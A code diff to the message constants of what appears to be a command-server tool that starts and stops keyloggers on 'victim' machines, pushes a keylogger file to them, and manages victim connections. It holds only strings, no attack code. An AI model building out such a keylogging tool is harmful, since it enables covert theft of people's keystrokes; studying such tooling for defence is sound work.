@@ -5,8 +5,7 @@ LOCAL_HOST = "localhost"
 LOCAL_HOST_VALUE = "127.0.0.1"
 MIN_QUEUE_SIZE = 5
 CLIENT_LIST_INITIAL_SIZE = 1
-NEW_CONNECTION_MSG = "[+] NOTICE: There is a new connection that has connected ({})"
-
+NEW_CONNECTION_MSG = "[+] NOTICE: There is a new client that has connected ({})"
 
 # MENU Constants
 OPENING_BANNER = "===================================== || COMMANDER PROGRAM || ====================================="
@@ -53,15 +52,15 @@ MAX_MENU_ITEM_VALUE = 13
 BYTE_LIMIT = 1024
 MIN_BUFFER_SIZE = 200
 MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
+RETURN_MAIN_MENU_MSG = "[+] Now returning to main menu..."
 
 # GENERAL CONSTANTS
 CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
                            "menu item 12)")
 CLIENT_RESPONSE = "[+] Client says: {}"
 
-
 # MENU ITEM 1 - Start Keylogger constants
-START_KEYLOG_INITIAL_MSG = "[+] Now starting keylogger on the client/victim side..."
+START_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 1] - Now starting keylogger on the client/victim side..."
 START_SEND_SIGNAL_MSG = ("[+] SENDING SIGNAL: Sending a signal to get client/victim to check if they have {}"
                          " installed... ({}, {})")
 START_SIGNAL_RECEIVED_MSG = "[+] SIGNAL RECEIVED: Client/victim is now checking if {} is installed on their machine..."
@@ -73,15 +72,26 @@ KEYLOG_FILE_CHECK_ERROR = "[+] ERROR: An error has occurred while checking if cl
 STATUS_TRUE = "TRUE"
 STATUS_FALSE = "FALSE"
 START_SIGNAL_EXECUTE_KEYLOG = "[+] SENDING SIGNAL: Sending a signal to client/victim to execute {}"
-MISSING_KEYLOG_FILE_MSG = "[+] TIP: Enter the number 3 to initiate a transfer of the keylog file to client/victim"
+MISSING_KEYLOG_FILE_SUGGEST_MSG = ("[+] TIP: Enter the number 3 to initiate a transfer of the keylog "
+                                   "file to client/victim")
 KEYLOG_OPERATION_SUCCESSFUL = "[+] OPERATION SUCCESSFUL: Keylog file saved on client/victim device!"
 KEYLOG_ERROR_MSG = "[+] ERROR: An error has occurred during the execution of keylogger: {}"
+KEYLOG_STATUS_TRUE_ERROR = "[+] This specific client (IP: {}, Port: {}) is already running the keylogger program!"
+KEYLOG_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop the keylogger for this specific client using menu item 2"
+STOP_KEYLOG_SUGGESTION_MSG = ("[+] TIP: To save and record keystrokes for this client (IP: {}, Port: {}), select "
+                              "menu item 2 (Stop Keylogger) after return to main menu")
 
 
 # MENU ITEM 2 - Stop Keylogger constants
-STOP_KEYLOGGER_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
-                         "on victim/client")
+STOP_KEYLOG_INITIAL_MSG = "[+] [MENU ITEM 2] - Now stopping keylogger on the client/victim side..."
+STOP_KEYLOGGER_MENU_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
+                              "on victim/client")
 STOP_KEYWORD = "STOP"
+STOP_KEYLOGGER_PROMPT = "[+] Enter the number 2 to 'Stop Keylogger': "
+INVALID_INPUT_STOP_KEYLOGGER = "[+] INVALID INPUT: Please try again: "
+STOP_KEYLOG_RESULT_ERROR = "[+] ERROR: An error has occurred during the keylogging process : {}"
+STOP_KEYLOG_STATUS_FALSE = ("[+] ERROR: Cannot stop keylogger for this specific client (IP: {}, Port: {} as "
+                            "they're currently not running the keylogger program!")
 
 # MENU ITEM 5 - DISCONNECT Constants
 DISCONNECT_FROM_VICTIM_MSG = "[+] DISCONNECTING FROM VICTIM: Now disconnecting from victim {}..."
@@ -89,7 +99,6 @@ DISCONNECT_FROM_VICTIM_SUCCESS = "[+] DISCONNECT SUCCESSFUL: Disconnection was s
 DISCONNECT_FROM_VICTIM_ERROR = "[+] DISCONNECT ERROR: There is no such client/victim to disconnect from!"
 ENTER_TARGET_IP_DISCONNECT_PROMPT = "[+] Enter victim IP address to disconnect from: "
 ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from: "
-
 
 # MENU ITEM 3 - TRANSFER KEYLOG Constants
 KEYLOG_FILE_NAME = "keylogger.py"
@@ -106,10 +115,8 @@ ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer 
 FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
                                             "connected to any clients")
 
-
 # MENU ITEM 12 - Connect to a specific victim
 INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
-
 
 # DESTINATION IP/PORT Constants
 NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
@@ -120,7 +127,6 @@ INVALID_DST_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for destination 
                                  "valid: (not between 0 and 65536)")
 NO_DST_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No destination IP Address (-d option) was specified!"
 NO_DST_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No destination port number (-p option) was specified!"
-
 
 # SOURCE IP/PORT Constants
 INVALID_SRC_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the source IP address was provided "
